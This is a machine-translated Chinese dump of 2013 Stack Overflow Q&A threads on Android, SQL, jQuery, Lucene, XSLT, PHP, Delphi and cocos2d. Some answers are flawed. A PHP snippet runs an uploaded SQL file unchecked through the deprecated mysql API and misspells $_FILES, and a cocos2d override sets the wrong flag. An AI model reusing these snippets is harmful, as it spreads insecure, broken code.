04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.support.v4.app.FragmentManagerImpl.popBackStackImmediate(FragmentManager.java:475)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.support.v4.app.FragmentActivity.onBackPressed(FragmentActivity.java:174)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.app.Activity.onKeyUp(Activity.java:2145)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.view.KeyEvent.dispatch(KeyEvent.java:2633)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.app.Activity.dispatchKeyEvent(Activity.java:2375)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchKeyEvent(PhoneWindow.java:1847)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.view.ViewRootImpl.deliverKeyEventPostIme(ViewRootImpl.java:3701)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.view.ViewRootImpl.handleImeFinishedEvent(ViewRootImpl.java:3651)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.view.ViewRootImpl$ViewRootHandler.handleMessage(ViewRootImpl.java:2818)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.os.Looper.loop(Looper.java:137)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.app.ActivityThread.main(ActivityThread.java:5041)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at java.lang.reflect.Method.invokeNative(Native Method)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at java.lang.reflect.Method.invoke(Method.java:511)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
04-06 05:41:50.436: E/AndroidRuntime(2352):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T03:56:54.137

只要弄清楚我的愚蠢错误。我`super.onStop()`在覆盖活动时打电话`onPause()`！

# android - 在 onclick 时强制关闭以传递意图

> ID：15847522
> 
> 赞同：0
> 
> 时间：2013-04-06T05:49:52.183
> 
> 标签：android, performance, android-intent

我在传递意图时在 imagebutton 处强制关闭。我没有传递意图，而是在 onclick 上传递了 toast，它已成功运行，但传递的意图未成功运行。

```
enter code here: 
```

有什么可能？？？

```
package com.account;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.*;
public class AccountTrackerActivity extends Activity implements OnClickListener{
    ImageButton user;
    ImageButton acc_list;
    ImageButton add_acc;
    ImageButton add_transaction;
    ImageButton search_trans;
    ImageButton remainder;
    ImageButton recent_trans;
    TextView curr_user;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        user=(ImageButton)findViewById(R.id.imageButton2);
        acc_list=(ImageButton)findViewById(R.id.imageButton3);
        add_acc=(ImageButton)findViewById(R.id.imageButton4);
        add_transaction=(ImageButton)findViewById(R.id.imageButton6);
        search_trans=(ImageButton)findViewById(R.id.imageButton7);
        remainder=(ImageButton)findViewById(R.id.imageButton8);
        recent_trans=(ImageButton)findViewById(R.id.imageButton5);
        curr_user= (TextView)findViewById(R.id.lblcurrent_user);

        user.setOnClickListener(this);
        acc_list.setOnClickListener(this);
        add_acc.setOnClickListener(this);
        add_transaction.setOnClickListener(this);
        search_trans.setOnClickListener(this);
        remainder.setOnClickListener(this);
        recent_trans.setOnClickListener(this);

    }
            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub
                try
                {

    if(v.getId()==user.getId()){                    

            Intent myIntentlogin=new Intent(AccountTrackerActivity.this,login.class);
            startActivityForResult(myIntentlogin,101);
            }
    if(v.getId()==acc_list.getId()){
        //Intent myIntentacc_list=new Intent(getApplicationContext(),acc_list.class);
        Toast.makeText(getApplicationContext(),"hi....", Toast.LENGTH_LONG).show();
        //startActivityForResult(myIntentacc_list,101);
        //startActivity(myIntentacc_list);
    }
    if(v.getId()==add_acc.getId()){
        Intent myIntentadd_acc=new Intent(AccountTrackerActivity.this,add_acc.class);
        startActivityForResult(myIntentadd_acc,103);

    }
    if(v.getId()==add_transaction.getId()){
        Intent myIntentadd_transaction=new Intent(AccountTrackerActivity.this,add_transaction.class);
        startActivityForResult(myIntentadd_transaction,104);
    }
    if(v.getId()==search_trans.getId()){
        Intent myIntentsearch_trans=new Intent(AccountTrackerActivity.this,search_trans.class);
        startActivityForResult(myIntentsearch_trans,105);
    }
    if(v.getId()==remainder.getId()){
        Intent myIntentremainder=new Intent(AccountTrackerActivity.this,remainder.class);
        startActivityForResult(myIntentremainder,106);
    }
    if(v.getId()==recent_trans.getId()){
        Intent myIntentrecent_trans=new Intent(AccountTrackerActivity.this,recent_trans.class);
        startActivityForResult(myIntentrecent_trans,107);
    }
                }
                catch(Exception e)
                {
                    Toast.makeText(getApplicationContext(), e.getMessage(), Toast.LENGTH_LONG).show();
                }

            }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:21:05.313

从一项活动中传递数据

```
 Intent myIntentlogin= new Intent(AccountTrackerActivity.this,login.class);
myIntentlogin.putExtra("message", 103); //pass data to new activity here like this
startActivity(myIntentlogin); 
```

在另一个接收数据

```
Intent intent = getIntent();
String message = intent.getStringExtra("message"); 
```

参考这个[链接](http://developer.android.com/training/basics/firstapp/starting-activity.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:07:52.843

在你的代码中试试这个

```
 ImageButton ButtonOne=(ImageButton) findViewById(R.id.imageButton1); 
```

下面给出了您的 onclick 侦听器

```
 ButtonOne.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View arg0) {
            // TODO Auto-generated method stub
            teamsName=db.getAllTeams();
            teamone=true;
            Intent intent=new    Intent(MainActivity.this,NextActivity.class);
            intent.putExtra("item", teamsName);
            startActivityForResult(intent, 0);
        }
    }); 
```

您需要在清单文件中添加您的 NextActivity。

您的 Mainfest 如下所示

```
 <application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name="com.example.design.MainActivtiy"
        android:label="@string/app_name" 
         android:screenOrientation="portrait">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

   <activity
        android:name=".NextActivity"
        android:screenOrientation="portrait">
        </activity>
   </application>

  </manifest> 
```

# sql - 最小和最大日期问题

> ID：15847524
> 
> 赞同：0
> 
> 时间：2013-04-06T05:50:07.883
> 
> 标签：sql, database, datetime, join

我想获得存储在数据库中的最小日期和最大日期。

**为此，我使用了以下查询：**

```
select min(sauda_date) as MinDate,max(sauda_date) as MaxDate from tradefile 
```

我得到以下结果：

![在此处输入图像描述](https://i.stack.imgur.com/JqaWj.jpg)

但我知道这个结果是错误的。

**它应该是：**

2013 年 2 月 28 日为 MinDate，2013 年 3 月 22 日为 MaxDate。

**因此，我提到了以下问题：**

[SELECT MIN(DATE) 的 SQL 语法](https://stackoverflow.com/questions/8779829/sql-grammar-for-select-mindate)

**并将我的查询更改为：**

```
select min(sauda_date), max(sauda_date) from tradefile group by sauda_date 
```

**但我得到以下结果：**

![在此处输入图像描述](https://i.stack.imgur.com/pGsyO.jpg)

**虽然我的结果应该是：**

2013 年 2 月 28 日为 MinDate，2013 年 3 月 22 日为 MaxDate。

也尝试了这个查询：

```
select min(convert(datetime,sauda_date)), max(convert(datetime,sauda_date)) from tradefile group by convert(datetime,sauda_date) 
```

但没有结果。[预期]

我在哪里犯错？请帮我。

**注意：** Sauda_Date 在这里是 nvarchar 类型。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:54:21.613

“注意：Sauda_Date 在这里是 nvarchar 类型。”

那么问题来了——如果你选择 nvarchar 类型的最小值或最大值，那么 SQL 会使用字典排序——如 0 到 9、a 到 z。它还能用什么？它怎么可能知道您打算将它们解释为日期时间？

如果您无法更改架构并使列日期，那么您可以在使用它们之前将数据类型转换/转换为日期`min()`时间`max()`。

所以你想要类似的东西

`select min(convert(datetime,sauda_date)), max(convert(datetime,sauda_date)) from tradefile`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:56:29.663

试试这个：

```
select 
    min(CAST(sauda_date AS DATETIME)) as MinDate,
    max(CAST(sauda_date AS DATETIME)) as MaxDate 
from tradefile 
```

# jquery - jQuery验证不适用于此代码

> ID：15847527
> 
> 赞同：0
> 
> 时间：2013-04-06T05:50:13.677
> 
> 标签：jquery, jquery-validate

任何人都可以弄清楚为什么这段代码不起作用？我可以单击提交按钮并转到下一页而不选择任何内容。我希望仅当用户选择任何单选按钮时才允许用户转到下一页。谢谢

```
<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js'></script>
<script type='text/javascript' src='http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.js'></script>

  <script>
  $.noConflict();
  $(document).ready(function(){
    $("#form1").validate();
  });
  </script>

 <form method="post"  action="/action" id="form1" class="styled" enctype="multipart/form-data">
  <label for="name">1\. Choose Category</label><br />
<select class="required" id="cat1" name="category">
                <option>select Category</option>

                    <option class="required" value="10">Cars</option>
                    <option class="required" value="8">House</option>
                    <option class="required" value="11">Mobiles</option>
                    <option class="required" value="3">Bus</option>
                    <option class="required" value="6">Services</option>
          </select>

        <input type="submit" name="buttonSubmit" value="Next Step"   class="btn-submit img-swap"  id="submit"  />
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:41:53.157

从快速查看来看，您的代码似乎很好，但经过详细查看后，罪魁祸首是这个 html 行：

```
<option>select Category</option> 
```

...这还需要有一个（n）（空）`value`属性才能使插件正常工作，所以它应该看起来像：

```
<option value="">select Category</option> 
```

...或者更好：

```
<option selected="" value="" disabled="disabled">select Category</option> 
```

请参阅使用 jQuery **[v1.6.4](http://jsfiddle.net/cjfKt/)**的 JSFIDDLE，如我之前的评论中所述

# java - 如何使用 apache lucene 索引优化搜索

> ID：15847542
> 
> 赞同：0
> 
> 时间：2013-04-06T05:52:18.217
> 
> 标签：java, indexing, lucene

我正在使用 apache lucene 创建的索引搜索关键字，它返回包含给定关键字的文件的名称，现在我只想在 lucene search 返回的文件中再次细化搜索。如何使用 apache lucene 优化搜索。我正在使用以下代码。

```
 try
                    {

                     File indexDir=new File("path upto the index directory");
                    Directory directory = FSDirectory.open(indexDir);

                    IndexSearcher searcher = new IndexSearcher(directory, true);

                    QueryParser parser = new QueryParser(Version.LUCENE_36, "contents", new SimpleAnalyzer(Version.LUCENE_36));
                    Query query = parser.parse(qu);
                    query.setBoost((float) 1.5);
                    TopDocs topDocs = searcher.search(query, maxhits);
                    ScoreDoc[] hits = topDocs.scoreDocs;
                    len = hits.length;
                    int docId = 0;
                    Document d;

                for ( i = 0; i<len; i++) {
                 docId = hits[i].doc;
                d = searcher.doc(docId);
                filename= d.get(("filename"));

                  }

                  }

         catch(Exception ex){ex.printStackTrace();} 
```

我已经使用 as 内容和文件名在 lucene 索引中添加了文档。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T17:41:23.117

您想将[BooleanQuery](http://lucene.apache.org/core/old_versioned_docs/versions/3_0_1/api/all/org/apache/lucene/search/BooleanQuery.html)用于这样的事情。这将让您将原始搜索约束与细化的搜索约束结合起来。

例子：

```
 BooleanQuery query = new BooleanQuery();
    Query origSearch = getOrigSearch(searchString);
    Query refinement = makeRefinement();
    query.add(origSearch, Occur.MUST);
    query.add(refinement, Occur.MUST);
    TopDocs topDocs = searcher.search(query, maxHits); 
```

# java - 从源文件夹访问属性以导出到可运行的 jar

> ID：15847547
> 
> 赞同：0
> 
> 时间：2013-04-06T05:53:02.773
> 
> 标签：java, properties

当我导出到可运行的 jar 时，我需要从我的 jar 访问属性文件。所以当我将 props 文件放在 eclipse 中的项目根文件夹中时，它正在运行。但是导出时它没有被复制。所以我希望它放在源文件夹中. 那么如何从源文件夹访问它。

java.io.FileNotFoundException: config.properties（系统找不到指定的文件）在 java.io.FileInputStream.open(Native Method) 在 java.io.FileInputStream.(FileInputStream.java:106) 在 java.io。 FileInputStream.(FileInputStream.java:66) at com.my.ashwinsakthi.twitterclient.IplHashtagReader.main(IplHashtagReader.java:38)![在此处输入图像描述](https://i.stack.imgur.com/d5y0s.jpg)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:57:53.277

1、properties文件是否打包在jar文件中？

2、`MyClass.class.getResourceAsStream("/config.properties")`改为使用。

`new File(filename)`将在 user.dir 中搜索文件名

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T18:35:38.340

我将属性文件复制到 jar 中，并将我的 java 类文件放在哪里，它在那里工作......

# xml - 使用 xsl 格式化 Xml 节点

> ID：15847551
> 
> 赞同：0
> 
> 时间：2013-04-06T05:53:17.103
> 
> 标签：xml, xslt

我是 xsl 的初学者，遇到格式化节点（即 UnitCost）值的问题。

我想要节点 UnitCost 值，即；5.0000（小数点后 4 个零）到使用 xsl 小数点后仅 2 个零。

xml文件：

```
 <root>
        <item>
        <link>http://localhost/Store/tabid/62/ProdID/1/Default.aspx</link>
        <P>
        <NB_Store_ProductsInfo>
        <ProductID>1</ProductID>
        <PortalID>0</PortalID>
        <TaxCategoryID>-1</TaxCategoryID>
        <Featured>false</Featured>
        <Archived>false</Archived>
        <CreatedByUser>1</CreatedByUser>
        <CreatedDate>2010-07-10T05:04:40.233</CreatedDate>
        <IsDeleted>false</IsDeleted>
        <ProductRef />
        <Lang>en-US</Lang>
        <Summary />
        <Description>sdcvsdcsdc&amp;lt;br /&amp;gt;
        dcsdcsdcsdcsdcsdcsdcs</Description>
        <Manufacturer />
        <ProductName>Poster1</ProductName>
        <XMLData />
        <ModifiedDate>2010-07-10T05:25:48.077</ModifiedDate>
        <SEOName />
        </NB_Store_ProductsInfo>
        <M>
        <NB_Store_ModelInfo>
        <ModelID>1</ModelID>
        <ProductID>1</ProductID>
        <ListOrder>1</ListOrder>
        <UnitCost>5.0000</UnitCost>
        <Barcode/>
.... 
```

从 xml 文件中读取 UnitCost

```
<xsl:value-of select="./P/M/NB_Store_ModelInfo/UnitCost" /> 
```

任何帮助都是有帮助的..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:10:27.467

尝试使用该`format-number()`功能：

```
<xsl:value-of select="format-number(./P/M/NB_Store_ModelInfo/UnitCost, '#.00')" /> 
```

# ios - 有没有办法在不发送推送通知的情况下调用 saveCurrentTurnWithMatchData？

> ID：15847555
> 
> 赞同：3
> 
> 时间：2013-04-06T05:53:41.753
> 
> 标签：ios, apple-push-notifications, gamekit

我有一个游戏中心游戏，允许玩家每回合进行多次移动。在 iOS 6 中，Apple 在**saveCurrentTurnWithMatchData**中实现了一个很棒的功能，它允许您这样做——它将数据保存到游戏中心，以防止通过重复重做动作来防止作弊，而无需前进到下一个玩家。

问题是，我发现这实际上触发了当玩家结束回合时发送的相同推送*通知*。所以游戏中的其他玩家会在应用程序的图标上看到一个徽章，并错误地认为轮到他们了，而实际上并非如此。

有没有人找到解决方法？有什么方法可以在不发送推送通知的情况下调用**saveCurrentTurnWithMatchData ？**如果不是，这似乎是一个设计缺陷，应该引起苹果的注意。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-09T22:05:12.497

我同意，这似乎是一个设计缺陷。我还在开发一个回合制游戏，玩家可以在将控制权交给下一个玩家之前采取一些行动。同时，我希望其他玩家在观看比赛时能够见证他们的每一个动作。如果其他玩家没有运行该应用程序，我希望他们仅在将控制权传递给其他玩家时收到推送通知。

我没有使用 ，而是`saveCurrentTurnWithMatchData:`使用`endTurnWithNextParticipants:`但我指定了当前播放器而不是下一个播放器。这似乎可以解决问题：

```
NSTimeInterval interval = 86400; // seconds in a day
[currentMatch 
  endTurnWithNextParticipants:[[NSArray alloc] initWithObjects:currentMatch.currentParticipant,nil] 
  turnTimeout:interval matchData:[self packMatchData]
  completionHandler:^(NSError *error) {
    if (error) {
       // handle error
    }
  }
]; 
```

# android - Display.getSize 与 Dispaly.getWidth

> ID：15847556
> 
> 赞同：4
> 
> 时间：2013-04-06T05:53:56.100
> 
> 标签：android

我这里有一个小问题...我想获得显示的大小，我可以通过调用已弃用的`Display.getWidth`/来获得它，`.getHeight`或者我可以使用`Display.getSize`...

但这是我的问题......我不想使用不推荐使用的代码，所以这让我`Display.getSize`......但这需要`API 13`并且我希望我的 min-API 是 8....

我该怎么办？还有其他选择吗？

```
Point size = new Point();
display.getSize(size);

width = size.x;
height = size.y; 
```

对比

```
width = display.getWidth();
height = display.getHeight(); 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-06T05:57:08.683

使用[显示指标](http://developer.android.com/reference/android/util/DisplayMetrics.html)

```
DisplayMetrics display = this.getResources().getDisplayMetrics();

        int width = display.widthPixels;
        int height = display.heightPixels; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:11:41.757

一个更一般的 SO 问题解释了如何使用更新的 API 级别并仍然与旧的 API 级别保持[兼容](https://stackoverflow.com/questions/9959990/how-do-i-check-honeycomb-or-higher-is-running-and-accordingly-call-a-method-for "这里")。

# php - php程序读取 .sql 文件并自动生成表并在 MySQL 数据库中插入数据？

> ID：15847558
> 
> 赞同：-3
> 
> 时间：2013-04-06T05:54:03.577
> 
> 标签：php

php程序读取.sql文件并自动生成表并在MySQL数据库中插入数据？（我导出所有数据库表..sql 我想要一个读取 .sql 文件并自动生成所有表并将数据插入其中的 php 程序..）

提前致谢..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T08:13:23.197

试试下面的库，它将帮助您上传 .sql 文件并执行它的内容

[http://www.ozerov.de/bigdump/](http://www.ozerov.de/bigdump/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:07:31.803

尝试

```
<?php
    if(isset($_FILE["file"])){ 
        $dshost = "";
        $dsdatabase = "";
        $dsusername = "";
        $dspassword = "";
        $connection1 = mysql_connect($dshost,$dsusername,$dspassword);
        $seldb = mysql_select_db($dsdatabase, $connection1) or die( "Unable to select database");
        $sql = file_get_contents($_FILE['file']);
        $q=mysql_query($sql) or die(mysql_error());
        if($q){
            echo "Success!";
        }else{
            echo "Fail.";
        }
    }else{
        ?>
        <form action="upload_file.php" method="post"
        enctype="multipart/form-data">
        <label for="file">Filename:</label>
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="Submit">
        </form>
        <?php 
    }
?> 
```

我认为我做对了。除非我不告诉你改用 PDO 或 mysqli，否则人们会对我大喊大叫。显然您需要在顶部添加自己的 sql 凭据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:08:23.520

好的，就是这样，如果你对编程有一点了解，你就会明白，否则你需要上学。这是制作表格的命令和数据

```
 CREATE TABLE IF NOT EXISTS `wp_options` (
  `option_id` bigint(20) unsigned NOT NULL auto_increment,
  `option_name` varchar(64) NOT NULL default '',
  `option_value` longtext NOT NULL,
  `autoload` varchar(20) NOT NULL default 'yes',
  PRIMARY KEY  (`option_id`),
  UNIQUE KEY `option_name` (`option_name`)
) ENGINE=MyISAM AUTO_INCREMENT=151 DEFAULT CHARSET=utf8; 
```

以下是数据，请注意，这只是示例，我们不会完全按照您的意愿去做，但我们可以帮助您入门。

```
INSERT INTO `wp_options` VALUES (1, 'siteurl', 'http://www.lostknowledge.org', 'yes');
INSERT INTO `wp_options` VALUES (2, 'blogname', 'Lost Knowledge', 'yes');
INSERT INTO `wp_options` VALUES (3, 'blogdescription', 'Just another WordPress site', 'yes');
INSERT INTO `wp_options` VALUES (4, 'users_can_register', '0', 'yes');
INSERT INTO `wp_options` VALUES (5, 'admin_email', '8156345@gmail.com', 'yes');
INSERT INTO `wp_options` VALUES (6, 'start_of_week', '1', 'yes');
INSERT INTO `wp_options` VALUES (7, 'use_balanceTags', '0', 'yes');
INSERT INTO `wp_options` VALUES (8, 'use_smilies', '1', 'yes');
INSERT INTO `wp_options` VALUES (9, 'require_name_email', '1', 'yes');
INSERT INTO `wp_options` VALUES (10, 'comments_notify', '1', 'yes');
INSERT INTO `wp_options` VALUES (11, 'posts_per_rss', '10', 'yes');
INSERT INTO `wp_options` VALUES (12, 'rss_use_excerpt', '0', 'yes');
INSERT INTO `wp_options` VALUES (13, 'mailserver_url', 'mail.example.com', 'yes'); 
```

给出你想从文件中使用它的问题，你可以使用 &sql = file_get_contents(filename.sql) 和 harki krishnan 告诉然后在命令创建表后插入 $sql 如果不存在

# delphi - 在面板或表单上设置组件可见属性

> ID：15847562
> 
> 赞同：0
> 
> 时间：2013-04-06T05:54:24.733
> 
> 标签：delphi

如何从表单或面板中获取所有组件并将 visible 属性设置为 false ？

```
 ///  
   ///    loop all components, this is just an idea for the solution ,,,,
   ///

   for i:= 0 to myPanel.ComponentsList do
        begin

        ///

        MyComponent.visible := false; 

        end; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T05:58:29.533

为此目的使用[Controls数组。](http://docwiki.embarcadero.com/Libraries/XE3/en/Vcl.Controls.TWinControl.Controls)

例如：

```
for I := 0 to Panel1.ControlCount - 1 do
  Panel1.Controls[I].Visible := False; 
```

# php - 从 $_SERVER['PATH_INFO'] 分析路径的正确方法

> ID：15847575
> 
> 赞同：3
> 
> 时间：2013-04-06T05:56:47.280
> 
> 标签：php

我正在尝试用 PHP5.4 编写一个小型 RESTful 服务 API（用于教育目的）。因此，我需要分析调用服务的 URL。

我想要这样做的方法是剥离 URL 路径`$_SERVER['PATH_INFO']`并将它们放入数组中。假设路径信息包含`/contacts/14295/`. 将两条路径放入如下数组的正确方法是什么？

```
array(2) {
 [0]=>
 string(8) "contacts"
 [1]=>
 string(5) "14295"
} 
```

我发现至少有两种方法可以将路径信息字符串拆分为一个数组，但是这两种方法都会导致一个包含两个以上条目的数组。

我发现的第一种方法是[explode](http://php.net/manual/de/function.explode.php)函数，它返回一个带有尾随空字符串的数组（意味着第一个和最后一个数组条目包含一个空字符串）：

```
explode('/', $_SERVER['PATH_INFO']); 
```

然后我尝试了 preg_split 函数，它返回一个数组，其中包含每个斜杠（'/'）的条目：

```
preg_split('//', $_SERVER['PATH_INFO']); 
```

这两种变体对我来说从 URL 获取路径都很不方便。我想知道是否没有更好的方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:06:24.297

从数组的开头和结尾修剪“/”？

```
$array = explode('/', trim($_SERVER['PATH_INFO'], '/') ); 
```

# python - bz2.decompress(rawdata) 什么时候出现“找不到流结尾”的错误？

> ID：15847581
> 
> 赞同：1
> 
> 时间：2013-04-06T05:57:20.687
> 
> 标签：python, scipy, compression

我检查了我磁盘中的文件是否与[https://github.com/scipy/scipy/blob/master/scipy/misc/face.dat相同](https://github.com/scipy/scipy/blob/master/scipy/misc/face.dat)

## 但是当我运行这个语句时，我得到了这个错误。为什么 ？

```
scipy.misc.face()

Traceback (most recent call last):
File "<stdin>", line 1, in <module>
File "C:\Python27\lib\site-packages\scipy\misc\common.py", line 567, in face
data = bz2.decompress(rawdata)
ValueError: couldn't find end of stream 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T16:23:50.513

这是一个错误（在 Windows 上），请参见此处

[https://github.com/scipy/scipy/commit/7f0210fd28a2b3be79806d5cae462be52c1601e9](https://github.com/scipy/scipy/commit/7f0210fd28a2b3be79806d5cae462be52c1601e9)

# jquery - 在 jQuery 中禁用鼠标离开

> ID：15847583
> 
> 赞同：-2
> 
> 时间：2013-04-06T05:57:21.047
> 
> 标签：jquery

我使用以下代码在`mouseover`触发事件时显示工具提示`.iconImage`：

```
 $('body').append('<span id="note-tooltip-wrapper"><a href="#" class="close">Slet <img src="/images/note-close-icon.png"></a><span class="content"></span><span class="bottom"><a href="#" class="edit">Ret</a></span></span>');
    $('.show .iconimage').wrap("<span class='note-tip-wrapper'></span>").closest('.note-tip-wrapper').css({ 'position': 'relative' });
    $('.show .iconimage').mouseover(function () {
        var $tipheight = $(this).closest('.note-tip-wrapper').find('.show .iconimage').height();
        var $tipwidth = $(this).closest('.note-tip-wrapper').find('.show .iconimage').width();
        var $html = $(this).closest('p.show').next('.longnote').html();
        $('#note-tooltip-wrapper').appendTo($(this).closest('.note-tip-wrapper')).fadeIn(300).css({ 'position': 'absolute', 'left': 0, 'top': 0, 'z-index': '10000' }).find('.content').html($html);
        $('#note-tooltip-wrapper .save').trigger('click');
    });
    $('#note-tooltip-wrapper').mouseleave(function() {
      $(this).fadeOut(300);
    });
    //$('#note-tooltip-wrapper .close').live('click', function () {
    //    $(this).closest('#note-tooltip-wrapper').hide();
    //});
    $('#note-tooltip-wrapper .edit').live('click', function () {
        $(this).removeClass('edit').addClass('save').text('spare');
        var $html = $(this).closest('#note-tooltip-wrapper').find('.content .editNote').html();
        $(this).closest('#note-tooltip-wrapper').find('.content .editNote').html('<textarea cols="5" rows="5">' + $html + '</textarea>');
    });
    $('#note-tooltip-wrapper .save').live('click', function () {
        $(this).removeClass('save').addClass('edit').text('ret');
        var $html = $(this).closest('#note-tooltip-wrapper').find('.content textarea').val();
        //console.log($html)
        $(this).closest('#note-tooltip-wrapper').find('.content .editNote').html($html);
        $(this).closest('p.show').next('.longnote').find('.editNote').html($html);
    }); 
```

`mouseover`此代码在和上正确显示工具提示`mouseout`，但我想在单击`mouseout`时触发`.edit`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:05:15.760

`mouseleave`您可以以编程方式触发：

```
$('#note-tooltip-wrapper').trigger('mouseleave'); 
```

# ios - 如何删除 CCMenuItemLabel 上的悬停刻度？

> ID：15847585
> 
> 赞同：1
> 
> 时间：2013-04-06T05:57:28.610
> 
> 标签：ios, cocos2d-iphone, ccmenuitem, cclabelttf

我的场景中有一个 CCMenuItemLabel，当我用手指按住标签时，它会变大。现在我不想要那个，我不知道该怎么做。

我搜索了 cocos2d ccmenuitemlabel hover 但没有找到我要搜索的内容。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T10:48:15.190

扩展 CCMenuItemLabel 并覆盖两个方法

```
-(void) selected {
    if(isEnabled_) {
        isSelected_=YES;
        // do your own anim here (or not !)
    }
}

-(void) unselected {
    if(isEnabled_) {
        isSelected_=YES;
        // undo whatever you did 
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T07:29:04.730

`isTouchEnabled`您可以通过设置为禁用此项目所在菜单的触摸`NO`。如果您的菜单包含其他项目，而不仅仅是在不同的菜单中创建标签。

这很麻烦，但它会起作用。

# sql-server - SQL Server 外连接问题

> ID：15847586
> 
> 赞同：0
> 
> 时间：2013-04-06T05:57:31.667
> 
> 标签：sql-server, outer-join

我在让外部连接工作时遇到了一些麻烦：过去我已经让它们按预期在 MS Access 中工作，但是在 SQL Server 中发生类似的事情给我带来了问题。

我有一张适用于每个学生的分数表，例如：

```
+-------------+------------+-------+
| StudentID   | StandardID | Score |
+-------------+------------+-------+
| 100         | 1011       | 1     |
| 100         | 1012       | 2     |
| 101         | 1011       | 3     | 
```

每个学生可能有很多分数，每个分数都与一个标准相关。此外，每个学生可能属于一个或多个组，这些组包含在另一个表中，组：

```
+-------------+------------+
| StudentID   | GroupID    |
+-------------+------------+
| 100         | 83         |
| 101         | 83         | 
```

我想要做的是提取分数信息并按组过滤：然后这个数据集将由 StudentID 匹配到其他地方的正确记录。但是，对于任何给定学生的每个检索到的数据集，都需要完全相同的行数：每个标准一个。理想情况下（对于上述数据）：

```
StudentID = 100
+------------+-------------+------------+-------+
| StandardID | StudentID   | GroupID    | Score |
+------------+-------------+------------+-------+
| 1011       | 100         | 83         | 1     |
| 1012       | 100         | 83         | 2     |

StudentID = 101
+------------+-------------+------------+-------+
| StandardID | StudentID   | GroupID    | Score |
+------------+-------------+------------+-------+
| 1011       | 101         | 83         | 3     |
| 1012       | 101         | 83         | NULL  | <--Can't get this to happen 
```

我可以拉出我想要的列表，但那里没有 NULL 行。再举一个例子，如果一个学生有 4 个分数，而另一个学生只有 1 个分数，我仍然需要查询返回 4 行，其中没有的分数为 NULL。

这是我迄今为止尝试过的（有点冗长，但本质上）：

```
SELECT Standards.StandardID, scores.StudentID, scores.TestDate, scores.Score, 
    scores.Assessment
FROM scores RIGHT OUTER JOIN
    (SELECT scores_1.StandardID
     FROM scores AS scores_1 INNER JOIN studentGroups 
         ON scores_1.StudentID = studentGroups.StudentID
     WHERE (studentGroups.GroupID = 83)
     GROUP BY scores_1.StandardID) AS Standards 
ON scores.StandardID = Standards.StandardID
WHERE scores.StudentID = 100 
```

任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:25:01.017

你能给我们提供数据库结构吗因为要为所有学生返回相同数量的行，你需要创建一个具有不同 StandardID 的临时表，然后使用外连接为所有学生获取相同数量的行。

为进一步和适当的ans提供表格结构。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T08:40:17.453

我使用`scores`and`groups`作为上面描述的两个表。你使用了更多的术语，所以我（也许是）有点困惑。但是，这应该有效：

```
select AllStandards.StandardID,
       groups.StudentID,
       groups.GroupID,
       Scores.Score
from   (select distinct StandardID from scores) AllStandards
       left join (
         scores 
         join groups 
           on groups.StudentID = scores.StudentID
         )
         on AllStandards.StandardID = scores.StandardID
